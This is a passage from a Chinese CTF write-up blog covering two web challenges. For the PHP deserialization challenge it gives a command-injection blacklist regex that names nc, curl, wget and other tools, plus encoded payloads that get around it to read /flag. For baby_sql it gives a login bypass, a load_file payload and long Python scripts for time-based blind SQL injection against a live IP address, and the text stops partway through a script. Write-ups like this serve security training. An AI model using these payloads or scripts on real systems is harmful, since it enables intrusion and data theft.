class=\"string\">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\\$|\\x00|`|env|\\?|wget|\\&quot;|\\&#x27;|\\\\\\|php|id|whoami|=/i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;payload)) &#123; </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$this</span>-&gt;payload.<span class=\"string\">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;fuck you Hacker&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t没有过滤空格，还算好（主要是因为这里不知道为啥我用一些手法绕不过空格，我就没有管了，毕竟 $ 没了，多个重定向符也有问题，过不了 /dev/null），寻常的 ls，dir 都被过滤了，大小于符号和中括号没有过，通配符过滤了，反斜杠也过滤了，那就用中括号和文件名来绕过吧，先来一波：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//payload:/bin/l[s] ||</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:12:&quot;/bin/l[s] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoxMjoiL2Jpbi9sW3NdIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t成功打出组合拳，这里存在一个无回显的一个绕过，需要用 || 来绕过 <code>&gt;/dev/null 2&gt;&amp;1</code> ，原理就是让这一串单独执行或者不执行即可。</p>\n<p>​\t\t之后就是读取 flag 了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">///bin/ca[t] /fla[g] ||</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:21:&quot;/bin/ca[t] /fla[g] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyMToiL2Jpbi9jYVt0XSAvZmxhW2ddIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19Cg==</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后读取源码找到了 flag</p>\n<h3 id=\"baby_sql\"><a class=\"markdownIt-Anchor\" href=\"#baby_sql\">#</a> baby_sql：</h3>\n<h4 id=\"非预期\"><a class=\"markdownIt-Anchor\" href=\"#非预期\">#</a> 非预期：</h4>\n<p>​\t\tindex 页面的 password 存在 sql 注入，本来想出弱密码的，结果没注意到这里也能打注入，被 sqlmap 一把梭了。</p>\n<p>​\t\t首先万能密码登陆之后，用 group by 确定字段数，接着这里 可以用 loadfile 来快速出 flag。当然，这是建立在 flag 的文件 确实在根目录并且名字确实是 flag，而且存在其他限制，成 功逃课的可能性并不是很大，这里因为同时存在两个原因导致了非预期，一是因为题目部署到平台的时候有个参数忘记删了，这个参数导致了 flag 会被写入 /flag，另外，题目测试的时候，var_dump 我忘记删了，会把信息给一同打印出来，就导致了这个题有回显，我的锅啊。</p>\n<p><code>payload：-1'/**/union/**/select/**/1,1,load_file('/flag')#</code></p>\n<h4 id=\"预期解\"><a class=\"markdownIt-Anchor\" href=\"#预期解\">#</a> 预期解</h4>\n<p>​\t\t首先，index 是一个登陆框，排除弱密码的可能，别问为什么，因为爆不出来，直接考虑万能密码，根据密码是存在字符和字母数字的，所以预测为字符型，直接 <code>1' or 1=1#</code> 即可</p>\n<p>​\t\t第二页有个莫名其妙的报错，不管。</p>\n<p>​\t\t拿到这个题的第一时间 fuzz 一下过滤，先做几个尝试，首先，我没捣鼓过这个题能否做布尔盲注，所以直接上时间盲注的手法。随便写入一些，触发过滤，发现有异常输出，也就是 NO,Hacker，好了，可以跑字典了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> requests <span class=\"keyword\">import</span> post</span><br><span class=\"line\"></span><br><span class=\"line\">lst = [<span class=\"string\">&quot;select&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;update&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;from&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;where&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;union&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;like&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;and&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;delete&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;drop&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;insert&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;join&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;hex&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;or&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;if&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;xor&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;not&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;table_name&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;CHAR&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;group_concat&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;information&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;schema&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;columns&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;regexp&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;greatest&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;ascii&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;substr&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;strcmp&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;in&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;between&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;database&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;offset&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;limit&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;sleep&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;benchmark&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;bin&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;mid&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;substring&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;updatexml&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot; &quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;--&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;\\&#x27;&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;\\&quot;&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;()&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;-&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;+&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;#&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;*&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;/&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;!&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;,&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;`&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;&amp;&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;|&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;;&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;^&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;%&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;@&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;=&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;&lt;&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;&gt;&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">temp = <span class=\"string\">&quot;NO,Hacker&quot;</span></span><br><span class=\"line\">a = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> lst:</span><br><span class=\"line\">    url = <span class=\"string\">&quot;http://127.0.0.1/worker.php&quot;</span></span><br><span class=\"line\">    data = &#123;<span class=\"string\">&quot;name&quot;</span>:i&#125;</span><br><span class=\"line\">    rsp = post(url, data=data)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> temp <span class=\"keyword\">in</span> rsp.text:</span><br><span class=\"line\">        a.append(i)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(a)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#[&#x27;update&#x27;, &#x27;delete&#x27;, &#x27;drop&#x27;, &#x27;insert&#x27;, &#x27;join&#x27;, &#x27;hex&#x27;, &#x27;CHAR&#x27;, &#x27;information&#x27;, &#x27;updatexml&#x27;, &#x27; &#x27;, &#x27;--&#x27;, &#x27;=&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;]</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t最后跑出来和我预计的差不多，然后因为又是可以输入字符等等，推测还是字符型注入，随机构造一下 payload 看看能否成功：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> requests <span class=\"keyword\">import</span> post</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://154.64.254.169:33161/worker.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&quot;111&#x27;/**/or/**/if((select/**/database())/**/like/**/database(),sleep(5),sleep(0))#&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;name&quot;</span>:payload&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">istime</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        resp = post(url,data=data,timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;not&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;timeout&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(istime(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#timeout</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t可以盲注，因为过滤了 infomation，所以需要用 innodb 来绕过，先跑，直接梭哈（脚本每次的时间会很长，这个是为了保证正确率，因为远程测试的时候出现了服务器扛不住的情况，所以，需要增加等待时长来防止服务器宕机）：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#测试的时候服务器有点问题，爆破的时候总是要出问题，建议每一个函数多跑几次保证成功率，或者每次多修改一些time和sleep的时长保证正确率</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> requests <span class=\"keyword\">import</span> post</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">alpha = <span class=\"string\">&quot;&quot;&quot;&#123;_&#125;[]-&quot;&quot;&quot;</span> + string.ascii_letters + string.digits</span><br><span class=\"line\">url = <span class=\"string\">&quot;http://154.64.254.169:33113/worker.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">istime</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        resp = post(url,data=data,timeout=<span class=\"number\">20</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;not&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;timeout&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数据库长度为：7</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">db_name_len</span>():</span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;g01den&#x27;/**/or/**/if((select/**/length(database()))/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;name&quot;</span>:payload&#125;</span><br><span class=\"line\">        <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;数据库长度为：%d&quot;</span>%i)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#数据库名为greatsql</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">db_name</span>():</span><br><span class=\"line\">    name = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> alpha:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;g01den&#x27;/**/Or/**/if(substr(database(),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">                name += j</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;数据库的名字是&quot;</span>+name)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数据库的个数为4</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">db_name_count</span>():</span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;g01den&#x27;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)/**/like/**/&#123;&#125;,sLeep(20),sLeep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">        <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;数据库的个数为&quot;</span>+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [10, 5, 5, 7]</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">db_name_len_list</span>():</span><br><span class=\"line\">    name_len_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">4</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">100</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;g01den&#x27;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats/**/limit/**/&#123;&#125;,1)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">            <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> istime(data) == <span class=\"string\">&quot;timeout&quot;</span>:</span><br><span class=\"line\">                name_len_list.append(j)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(name_len_list)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name_len_list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 上一个查询结果为四次，所以手动查四次，没跑完一次，修改limit后面的参数，以及第一层for循环的参数</span></span><br><span class=\"line\"><span class=\"comment\"># flag1shere</span></span><br><span class=\"line\"><span class=\"comment\"># mysql</span></span><br><span class=\"line\"><span class=\"comment\"># users</span></span><br><span class=\"line\"><span class=\"comment\"># workers</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">db_name_list</span>():</span><br><span class=\"line\">    name = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> alpha:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(database_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/limit/**/3,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class=\"built_in\">format</span>(i,j)</span><br><span class=\"line\">            data = &#123;<span class=\"string\">&quot;name&quot;</span>: payload&#125;</span><br><span class=\"line\">            <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">            